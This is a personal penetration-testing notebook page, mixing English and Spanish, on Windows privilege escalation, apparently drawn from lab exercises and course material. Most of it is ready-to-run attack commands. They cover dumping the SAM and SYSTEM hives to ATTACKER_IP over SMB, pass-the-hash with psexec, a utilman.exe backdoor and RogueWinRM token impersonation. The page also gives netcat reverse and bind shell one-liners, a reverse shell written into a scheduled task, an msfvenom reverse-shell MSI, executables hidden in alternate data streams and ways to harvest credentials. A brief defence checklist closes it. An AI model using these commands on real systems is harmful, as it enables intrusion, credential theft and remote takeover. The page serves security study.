
</div></div>

## Abusing dangerous privileges
 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Rights that an account has to perform specific system-related tasks.
- Check them `whoami /priv`
- List of windows privileges [[List of windows privileges\|List of windows privileges]]
- List of Windows [[Exploitable privileges\|Exploitable privileges]].

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Abusing SeBackup-SeRestore

</div>


- Allow any user **read and write** to any **file** in the system, **ignoring** any [[DACL\|DACL]]
- The idea is allow to certain users **perform backups without** full **admin privileges**
- An attacker can use many methods to escalate.

Example:
- One method consists of **coping the [[SAM\|SAM]]** and  SYSTEM `registry hives` to **extract** the local Administrator's **password hash.**
- The account is part of the "Backup Operators" group, granted the 2 privileges above

<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



## Backup the SAM ans SYSTEM hashes
Create a file with the `registry hives` content:
```cmd
reg save hklm\system C:\Users\THMBackup\system.hive
```

```cmd
reg save hklm\sam C:\Users\THMBackup\sam.hive
```

</div></div>


<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



## Start simple smb server

<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



# smbserver
- [[smbserver.py\|smbserver.py]]
- Start a simple [[SMB\|SMB]] server
- Create a share named `public` pointing to the `share` directory
- On the attacker machine
```shell
wget https://raw.githubusercontent.com/fortra/impacket/master/examples/smbserver.py
mkdir share
python smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
```

</div></div>


</div></div>

Copy to the attacker machine
```powershell
copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
```
Retrieve passwords hashes

<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



# secretsdump
- [[secretsdump.py\|secretsdump.py]]
- Retrieve the users' password hashes:
- Dump hashes from the remote machine without executing any agent there.
```shell
wget https://raw.githubusercontent.com/fortra/impacket/master/examples/secretsdump.py
python secretsdump.py -sam sam.hive -system system.hive LOCAL
```

</div></div>

Perform a [[Pass-the-Hash\|Pass-the-Hash]] attack

<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



# psexec
- [[psexec.py\|psexec.py]]
- Get a cmd with need the username and password
```shell
psexec.py Administrator@VICTIM_IP
psexec.py Administrator@VICTIM_IP cmd.exe
```
- To exec a [[Pass-the-Hash\|Pass-the-Hash]] attack
Gain access to the target machine with `SYSTEM` privileges
```shell
wget https://raw.githubusercontent.com/fortra/impacket/master/examples/psexec.py
python psexec.py -hashes aad...e:8...4f5 administrator@VICTIM_IP
```
![Pasted image 20240822233408.png](/img/user/attachments/Pasted%20image%2020240822233408.png)

</div></div>


</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Abusing SeTakeOwnership

</div>


- This privilege allows a user to **take ownership** of any object on the system.(**files or registry**)
- Search for a service running as `SYSTEM` and **take** ownership of the service's **executable**.

Example:
- Check privileges
```shell
whoami /priv
```
![Pasted image 20240823084610.png|600](/img/user/attachments/Pasted%20image%2020240823084610.png)

## Abusing utilman.exe
- We need GUI
- Built-on windows app to provide ease of access options during the lock screen
- Replace the original binary for a payload
- Take ownership
```powershell
takeown /f C:\Windows\System32\Utilman.exe
```
- Being the owner doesn't necessarily mean that we have privileges over it, but you can assign yourself any privileges you need.
- Give us full permissions
```powershell
icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
```
- Replace `utilman.exe` with a copy of `cmd.exe`  on the `C:\Windows\System32\` folder
```powershell
copy cmd.exe utilman.exe
```
- Lock the screen from the start button
![Pasted image 20240823094514.png|200](/img/user/attachments/Pasted%20image%2020240823094514.png)
- Click on `ease of access` button and get a command prompt
![Pasted image 20240823094611.png|500](/img/user/attachments/Pasted%20image%2020240823094611.png)
## Meterpreter
- If we have a meterpreter session we can migrate to most privileged account using [[meterpreter#Migrate\|meterpreter#Migrate]]

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Abusing SeImpersonate - SeAssignPrimaryToken

</div>


- Allow to impersonate other user. (Spawn a process or thread)
- `LOCAL SERVICE` and `NETWORK SERVICE ACCOUNTS` already have such privileges to impersonate restricted accounts.
- [[IIS\|IIS]] create an restricted account called `iis apppool\defaultapppool`

Example
- Let's assume we have an [[FTP\|FTP]] service running with user `ftp`.
- Without impersonation, ff Ann login and try to access to her files, the `ftp` user try to access them using `ftp` token
![Pasted image 20240823104235.png](/img/user/attachments/Pasted%20image%2020240823104235.png)
- With Impersonation, the `ftp` user impersonate Ann and uses her token.
![Pasted image 20240823104521.png|800](/img/user/attachments/Pasted%20image%2020240823104521.png)
- As attacker, if we manage to take **control** of a **process** with the privileges above, we can **impersonate** any user **connecting** and **authenticating** to that process.
- To elevate privileges using such accounts we need.
	1. To spawn an malicious process to that user can connect and authenticate
	2. Find a way to force privileged users to connect and authenticate to the malicious process
	3.  We can use [[RogueWinRM\|RogueWinRM]]

Example
- Assuming we have a compromised website running on [[IIS\|IIS]] and we have a webshell
![Pasted image 20240823111923.png|500](/img/user/attachments/Pasted%20image%2020240823111923.png)

<div class="transclusion internal-embed is-loaded"><a class="markdown-embed-link" href="/notes/netcat/#listener-revershell" aria-label="Open link"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-link"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a><div class="markdown-embed">




- "Swiss Army Knife" of networking.
- Perform all kinds of network interactions.
- Support [[TCP\|TCP]] and [[UDP\|UDP]]
- Used to receive reverse shells and connect to remote ports attached to bind shells on a target system.
- If you choose to use a **port below 1024**, you will need to use `sudo` when starting your listener.
- It's **good idea** to **use** a **well-known** port number (**80, 443 or 53** being good choices) as this is more likely to get **past** outbound **firewall rules** on the target.

| Command   | Description                                                                        |
| --------- | ---------------------------------------------------------------------------------- |
| `-l`      | is used to tell netcat that this will be a listener                                |
| `-n`      | tells netcat not to resolve host names or use DNS. avoid DNS lookups and warnings. |
| `-v`      | is used to request a verbose output                                                |
| `-p`      | indicates that the port specification will follow.                                 |
| `-vv`     | Very Verbose (optional)                                                            |
| `-k`      | Keep listening after client disconnects                                            |
| `-w SECS` | Timeout for connects and final net reads                                           |
| `-u`      | Over [[UDP\|UDP]]                                                                       |
# Normal Connection
Listener Machine 1
```shell
nc -lnvp PORT
```

Secondary Machine 2
```shell
nc -nv IP_MACHINE_1 PORT
```
# Transfer files
1. On the destination machine
```shell
nc -lnvp 1234 > file.txt
```
2. On the source machine
```shell
nc -nv IP_destination 1234 < file.txt
```

# Banner grabbing
Connect to a service to get the *Banner Grabber*
```shell
nc -nv IP PORT
```
# Reverse shell

## On the attacker (Listener)
65535 total number of ports
Start a listener using rlwrap to try to simulate an interactive console
``` sh
rlwrap nc -lnvp 4747
```
ncat has more options like encrypt with ssl
``` bash
ncat --ssl 127.0.0.1 30001
```
To open tcp/udp in a host, assosiate a shell to a port, force UDP/TCP conexions
```bash
nc localhost 4747
```
## On the target
### Linux
Send a bash
```sh
nc <LOCAL-IP> <PORT> -c /bin/sh
nc <LOCAL-IP> <PORT> -c /bin/bash
nc -e /dev/tcp/ipattacker/443 0>&1
```
Create a [[named pipe\|named pipe]]
this is **not included in most versions of netcat** as it is widely seen to be very insecure
```sh
mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LOCAL-IP> <PORT> >/tmp/f
```
### Windows
**On Windows** this technique will **work perfectly**, where a static binary is nearly always required
Send a cmd
```sh
nc 10.10.38.232 443 -e “cmd.exe”
```
Send a powershell
```sh
nc 10.10.38.232 443 -e “powershell.exe”
```
# Bind shell
## On the target (Listener)
### Linux
```bash
nc -lnvp <port> -c /bin/sh
nc -lnvp <port> -c /bin/bash
```

On Linux, however, we would instead use this code to create a listener for a bind shell:
[[named pipe\|named pipe]]
```sh
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```
### Windows
Or get a cmd on windows
```sh
nc -lvnp <port> -e "cmd.exe"
```
## On the attacker
```bash
nc -nv <target-ip> <chosen-port>
```


</div></div>

Use the webshell to trigger the exploit (may take 2 min to work)
```powershell
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4747"
```
`-p` specify the executable to be run by the exploit
`-a` sets arguments to the `nc64.exe`
It's like `nc -e cmd.exe ATTACKER_IP 4747`
![Pasted image 20240823115456.png|500](/img/user/attachments/Pasted%20image%2020240823115456.png)
## Use [[Metasploit\|Metasploit]] incognito module

</div></div>

##  Abusing vulnerable software
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Abusing unpatched software

</div>


- As the drivers, organisations and users may not update the software regularly.
List software using [[wmic\|wmic]]
```powershell
wmic product get name,version,vendor
```
- Search for exploits on
[[Exploit-DB\|Exploit-DB]], [[packet storm\|packet storm]] google or github

# [[Case study Druva InSync 6.6.3\|Case study Druva InSync 6.6.3]]

</div></div>

### Abusing [[UAC\|UAC]]
## Harvesting passwords
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Unattended lnstalls

</div>


- In windows 32
- **Windows** can **automate** some **tasks**, such as mass installations.
- This is typically done **through the use** of the **Unattended Windows Setup Utility**
- This tool utilizes Windows Setup **configuration files are left on the target** system after installation, they can reveal user account **credentials**.
- Typically, utilizes the user and system configuration.
	- `C:\\Windows\Panther\Unattend.xml`
	- `C:\\Windows\Panther\Autounattend.xml`
- Could be this way too:
```powershell
C:\Windows\Panther\\N de la siguiente manera
C:\Windows\Panther\NUnattend
C:\WindowsSystem32
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```
Los atacantes explotan la información almacenada en Unattend.xml para escalar privilegios
you might encounter credentials:
```html
<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```
Example `Unattend.xml`
![Pasted image 20241025195956.png|600](/img/user/attachments/Pasted%20image%2020241025195956.png)
The plain text means if the [[base64\|base64]] option is enabled
![Pasted image 20241025200200.png|400](/img/user/attachments/Pasted%20image%2020241025200200.png)

</div></div>


### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



[[LFI-WordList-Windows\|LFI-WordList-Windows]]

| File                           | Descriptoin                                                |
| ------------------------------ | ---------------------------------------------------------- |
| `c:\boot.ini`                  | Contains the boot options for computers with BIOS firmware |
| `c:\Windows\System32\eula.txt` | OS version, built number, service pack                     |




</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Powershell History

</div>


It can be retrieved by using the following command from a `cmd.exe` prompt:
Only work on `cmd.exe`
```powershell
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
To read the file from Powershell, you'd have to replace `%userprofile%` with `$Env:userprofile`.

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Saved windows credentials

</div>


- Windows allows us to **use other users' credentials.**
- Also gives the option to **save these credentials on the system**.
List saved credentials:
```powershell
cmdkey /list
```
Example(user `mike.katz`):
![Pasted image 20240820193302.png|400](/img/user/attachments/Pasted%20image%2020240820193302.png)
if you notice any credentials worth trying, try it.
```powershell
runas /savecred /user:USER_NAME_HERE cmd.exe
```


</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### IIS Configuration

</div>


The config on websites on [[IIS\|IIS]] is stored in a file called `web.config`  and can store **password** for db or configured authentication mechanisms.
Might is on:
```powershell
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```
Example
![Pasted image 20240820191513.png](/img/user/attachments/Pasted%20image%2020240820191513.png)

Quick way to find database connection strings on the file:
```powershell
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

</div></div>

### Retrieve Credentials From software
#### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### From PuTTY

</div>



<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- SSH client commonly found on Windows.
- **Instead** of having to specify a **connection**'s parameters **every single time,** users can **store sessions** where the IP, user and other configurations can be stored for later use.
- Don't allow store SSH password
- Store proxy config including authentication credentials.

</div></div>

Retrieve the stored proxy credentials.
```powershell
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```
Simon Tatham is the creator of PuTTY
Example:
![Pasted image 20240820193930.png|500](/img/user/attachments/Pasted%20image%2020240820193930.png)

</div></div>

## Some easy ways
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Scheduled Tasks

</div>


Can be `schtasks` or `at`
We can see tasks either lost its binary or it's using a binary you can modify.
General info:
```powershell
schtasks
```
Specific info
```powershell
schtasks /query /tn vulntask /fo list /v
```
![Pasted image 20240820201808.png|600](/img/user/attachments/Pasted%20image%2020240820201808.png)
**If we can** **modify** or overwrite the "Task to Run" **executable**, we can control what gets executed by the taskusr1 user, and **we have a simple priv escalation**
Check executable permissions.
```powershell
icacls
```

```powershell
icacls c:\tasks\schtask.bat
```
![Pasted image 20240820202243.png|600](/img/user/attachments/Pasted%20image%2020240820202243.png)
We have full access and can **modify** the file and **insert a payload**
For example, we have a revshell file `nc64.exe`
```powershell
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```
Now wait to the schedule task runs again or run manually (less probable)
```powershell
schtasks /run /tn vulntask
```

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### AlwaysInstallElevated

</div>


- Windows installer files (also known as .msi files) are used to install applications on the system.
- Usually run with the level of the user.
- Can be configured to run with higher privileges

Requires 2 registry values to be set.
```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
If it's correct, generate a malicious .msi file using [[Msfvenom\|Msfvenom]]
```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```
Run the handler
Copy to the msi to the victim and run it
```powershell
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

</div></div>

## File system vulnerabilities

<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



## ADS PrivEsc
- Attackers can use [[ADS\|ADS]] to **hide malicious code or executables in** legitimate **files** in order to evade detection.
- This can be done by **storing** the malicious code or executables **in the** file attribute resource stream (**metadata**) **of** a legitimate **file**.
- This technique is usually used to **evade basic signature** based [[AV\|AV]]s and static scanning tools.

In windows
To create a normal file
```powershell
notepad testfile.txt
```

To create a normal file with metadata file
```
notepad testfile.txt:secretfile.exe
```

1. Store a `winpeas.exe` into a normal file `windowslog.txt`
```
type winpeas.exe > testfile.txt:winpeas.exe
```
2. Create a link
   Go to `C:\Windows\system32`
```powershell
mklink wupdate.exe C:\Temp\windowslog.txt:winpeas.exe
```
3. Execute `wupdate` to execute  `winpeas.exe`
```powershell
wupdate
```

</div></div>


## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Methodology
- Identifying kernel vulnerabilities
- Download compiling and transferring kernel exploits onto the target system

# Tools
- [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [Windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits/tree/master)
# Use [[Metasploit\|Metasploit]] module



</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

## DLL hijacking

</div>


Replace the DLL by a malicious

![Pasted_image_20230909115418.png](/img/user/attachments/Pasted_image_20230909115418.png)
## Exploit know vulnerabilities

Tools
	Robber
	PowerSploit


</div></div>


## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

## Library hijack

</div>


OSX
	Dylib hijadt
		Scanner to detect vuln
	Tool to make thje hijack
		OyUbhijack

</div></div>


## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

## Spectre

</div>


- Vulnerabilidades encontradas en el diseño de los modernos chips procesadores de AMO, ARM e Intel.
- Los atacantes pueden aprovechar esta vulnerabilidad para leer ubicaciones de memoria adyacentes de un proceso y acceder a información para la que no está autorizado.
- Usando esta vulnerabilidad, un atacante puede incluso leer la memoria del kernel o realizar un ataque basado en la web usando JavaScript.

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

## Named pipe impersonation

</div>


- In windows
- En Windows, Named Pipe con nombre proporcionan una comunicación legítima entre los sistemas en ejecución.
- Los atacantes a menudo explotan esta técnica para escalar privilegios en el sistema de la víctima a los de una cuenta de usuario que tiene mayores privilegios de acceso.
- Los atacantes utilizan herramientas como Metasplolt para realizar una impersonación de tuberías con nombre en un host de target.ç 
- Los atacantes utilizan comandos de Metasplolt como getsystem para obtener privilegios de nivel administrativo y extraer los hashes de las contraseñas de las cuentas de administrador/usuario.

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

## Other techniques

</div>


- Manipulación de tokens de acceso
El sistema operativo Windows utiliza tokens de acceso para determinar el contexto de seguridad de un proceso o hilo.
Los atacantes pueden obtener los tokens de acceso de otros usuarios o generar tokens falsos para conseguir privilegios y realizar acciones peligrosas evadiendo la detección.
- Aplicación Shimming
El marco de compatibilidad de aplicaciones de Windows llamado Shim se utiliza para proporcionar compatibilidad entre las versiones más antiguas y más nuevas del sistema operativo Windows Shims como RedirectEXE, injectDLL y GetProcAddress pueden ser utilizados por los atacantes para escalar privilegios, instalar puertas traseras, desactivar Windows Defender, etc.
- Debilidad de los permisos del sistema de archivos
El sistema operativo Windows utiliza tokens de acceso para determinar el contexto de seguridad de un proceso o hilo.
Los atacantes pueden obtener los tokens de acceso de otros usuarios o generar tokens falsos para conseguir privilegios y realizar acciones peligrosas evadiendo la detección.
- Interceptación de rutas
Las aplicaciones incluyen muchas debilidades y desconfiguraciones como rutas no citadas, desconfiguración de variables de entorno de la ruta y secuestro del orden de búsqueda que conducen a la interceptación de la ruta. La interceptación de rutas ayuda a un atacante a mantener la persistencia en un sistema y escalar privilegios.
- Lauch Deamon
Launchd se utiliza en el arranque de MacOS y OS X para completar el proceso de inicialización del sistema mediante la carga de parámetros para cada daemon de lanzamiento a nivel de sistema. Los daemons tienen plists que están vinculadas a ejecutables que se ejecutan en el arranque. El atacante puede alterar el ejecutable del daemon de lanzamiento para mantener la persistencia o para escalar privilegios.
- Plist Modification
Los archivos plist en MacOS y OS X describen cuándo deben ejecutarse los programas, la ruta del archivo ejecutable, los parámetros del programa, los permisos del sistema operativo necesarios, etc. Los atacantes alteran los archivos plist para ejecutar código malicioso en nombre de un usuario legítimo para escalar privilegios.
- Web Shell
Una shell web es un script basado en la web que permite el acceso a un servidor web. Los atacantes crean web shells para inyectar un script malicioso en un servidor web para mantener un acceso persistente y escalar privilegios.

![Pasted_image_20230909124442.png](/img/user/attachments/Pasted_image_20230909124442.png)

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

## Tools to escalate

</div>


### BeRoot 
es una herramienta de post-explotación para comprobar las configuraciones  rróneas más comunes para encontrar una forma de elevar los privilegios. Como se muestra en la captura de pantalla, utilizando esta herramienta, los atacantes pueden obtener información sobre los permisos de los servicios, los directorios en los que se puede escribir con sus ubicaciones, los permisos de las claves de inicio, etc.
### linpostexp
La herramienta linpostexp obtiene información detallada sobre el kernel,
que puede ser utilizada para escalar privilegios en el sistema objetivo. Como se muestra en la captura de pantalla, utilizando esta herramienta, los atacantes pueden obtener información sobre el kernel, los sistemas de archivos, el superusuario, los sudoers, la versión de sudo, etc. Los atacantes pueden utilizar esta información para explotar las vulnerabilidades presentes en el kernel para elevar sus privilegios. El siguiente comando se utiliza para extraer esta información sobre el sistema de destino: #python linprivchecker.py


</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

## How to defend escalate Windows

</div>


■ Restringir los privilegios de inicio de sesión interactiva.
■ Ejecutar usuarios y aplicaciones con los privilegios más bajos.
■ Implementar la autenticación y la autorización multifactoriales.
■ Ejecutar servicios como cuentas sin privilegios.
■ Implementar una metodología de separación de privilegios para limitar el alcance de los errores y fallos de
programación.
■ Utilizar una técnica de cifrado para proteger los datos sensibles.
■ Reducir la cantidad de código que se ejecuta con un determinado privilegio.
■ Realizar la depuración utilizando comprobadores de límites y pruebas de esfuerzo.
■ Probar a fondo el sistema para detectar errores de codificación de la aplicación y bugs.
■ Parchear y actualizar periódicamente el kernel.
■ Cambiar la configuración del [[UAC\|UAC]] a "Siempre notificar", de modo que aumente la visibilidad del usuario
cuando se solicite la elevación del [[UAC\|UAC]].
■ Restringir a los usuarios la escritura de archivos en las rutas de búsqueda de las aplicaciones.
■ Supervisar continuamente los permisos del sistema de archivos mediante herramientas de auditoría.
■ Reducir los privilegios de las cuentas y grupos de usuarios para que sólo los administradores legítimos
puedan realizar cambios en el servicio.
■ Utilizar herramientas de listas blancas para identificar y bloquear el software malicioso que cambia los
permisos de archivos, directorios o servicios.
■ Utilizar rutas totalmente cualificadas en todas las aplicaciones de Windows.
■ Asegúrese de que los ejecutables ali se colocan en directorios protegidos contra escritura.
■ En los sistemas operativos Mac, impida que los archivos plist sean alterados por los usuarios haciéndolos de
sólo lectura.
■ Bloquear las utilidades del sistema no deseadas o el software que pueda utilizarse para programar tareas.
■ Parchear y actualizar regularmente los servidores web.
■ Desactivar la cuenta de administrador local por defecto.
■ Detectar, reparar y solucionar cualquier fallo o error que se ejecute en los servicios del sistema.

### Defender contra el abuso de los derechos sudo:
■ Implementar una política de contraseñas fuertes para los usuarios sudo.
■ Desactivar el almacenamiento en caché de las contraseñas estableciendo el timestamp_timeout en O, de
modo que cada vez que se ejecute sudo los usuarios deban introducir su contraseña.
■ Separar las cuentas administrativas de nivel sudo de las cuentas regulares del administrador, para evitar el
robo de contraseñas sensibles.
■ Actualizar los permisos y las cuentas de los usuarios a intervalos regulares.
■ Probar los usuarios sudo con acceso a programas que contengan parámetros para la ejecución de código
arbitrario.

</div></div>
